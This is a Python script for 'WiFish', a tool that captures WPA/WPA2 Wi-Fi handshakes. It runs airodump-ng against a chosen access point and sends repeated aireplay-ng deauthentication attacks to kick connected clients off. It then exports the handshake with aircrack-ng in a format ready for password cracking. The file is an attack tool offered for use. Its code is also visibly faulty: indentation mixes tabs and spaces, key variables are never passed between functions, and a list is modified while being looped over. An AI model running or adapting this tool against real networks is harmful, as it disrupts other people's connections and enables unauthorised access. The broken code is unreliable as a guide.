
#https://github.com/dg300/wifish

from termcolor import cprint
import argparse
import subprocess
import time
import os
from csv  import reader


essid = ''
interface = ''
attack_delay = ''

dirPath = os.getcwd() + '/'
name = ('''

  .;'                     `;,    
 .;'  ,;'             `;,  `;,   WiFish v1.0 
.;'  ,;'  ,;'     `;,  `;,  `;,  
::   ::   :   ( )   :   ::   ::  Wireless Handshake Capturing Tool
':.  ':.  ':. /_\ ,:'  ,:'  ,:'  
 ':.  ':.    /___\    ,:'  ,:'   Github link:
  ':.       /_____\      ,:'     https://github.com/dg300/wifish
           /       \             


''')
def banner():
	cprint(name,'cyan')	
	cprint('\t  Wireless Handshake Capturing Tool\n', 'green', attrs=['bold'])
	cprint('A tool to automatically capture WPA/WPA2-PSK WiFi handshakes with aircrack-ng tools.\n\n',attrs=['bold'])
	cprint('Instructions before using:', 'red')
	print('Put your wireless interface into monitor mode using airmon-ng. ---> airmon-ng main wlan0')
	print('To find all nearby access points use airodump-ng. ---> airodump-ng wlan0mon')
	print('Run this program with the wireless interface name, attack delay time, access point name(essid),')
	print('and channel number. Close the program with Ctrl + c to write .cap and .hccapx results.\n\n')
banner()
def capture():
        #Starts capturing access point traffic using airodump-ng
	parser = argparse.ArgumentParser()
	parser.add_argument('interface', type=str, metavar='Interface', help='Wireless interface to be used.')
	parser.add_argument('essid', type=str, metavar='ESSID', help='ESSID name of the target access point')
	parser.add_argument('channel', type=str, metavar='Channel', help='Channel number the target access point is broadcasting on.')
        parser.add_argument('delay', type=int, metavar='Attack_Delay', nargs='?', const=5, help='Time in minutes between deauth attacks (Default is 5 minutes).', default=5)
        args = parser.parse_args()
	interface = args.interface
	essid = args.essid
	channel = args.channel
	attack_delay = 60*int(args.delay)
	subprocess.Popen(['airodump-ng', '-c', channel, '--essid', essid, '-w', 'dump_' + essid, interface])


def att():
        #aireplay-ng
	try:
		fileName = 'dump_' + essid + '-01.csv'
		time.sleep(10)
		while True:
			 mac_lst = []
			 with open(fileName, 'r') as mac_file:
				csv_reader = reader(mac_file)
				line_cnt = 0
				for row in csv_reader:
					if line_cnt == 2:
						bssid = row[0]
					if line_cnt >= 5 and len(row) > 0 and row[5] != ' (not associated) ':
						mac_lst.append(row[0])
					line_cnt = line_cnt + 1
				for mac in mac_lst:
					mac_lst.remove(mac)
					if mac not in mac_lst and len(mac_lst) > 0:
						with open(os.devnull, 'w') as fp:
							subprocess.Popen(['aireplay-ng', '--deauth', '5', '-a', bssid, '-c', mac, interface], stdout=fp)
			 time.sleep(attack_delay)
	except IndexError:
		while True:
			time.sleep(10)


def wrap():
        #renames capture file delete other log files
	subprocess.call(['cp', dirPath + 'dump_' + essid + '-01.cap', dirPath + essid + '.cap'])
	subprocess.call(['aircrack-ng', '-j', dirPath + essid, 'dump_' + essid + '-01.cap'])
        os.system('rm ' + dirPath + 'dump_*')
        quit()

def main():
	try:
		capture()
		att()
	except KeyboardInterrupt:
		wrap()

if __name__ == '__main__':
    main()
		

						

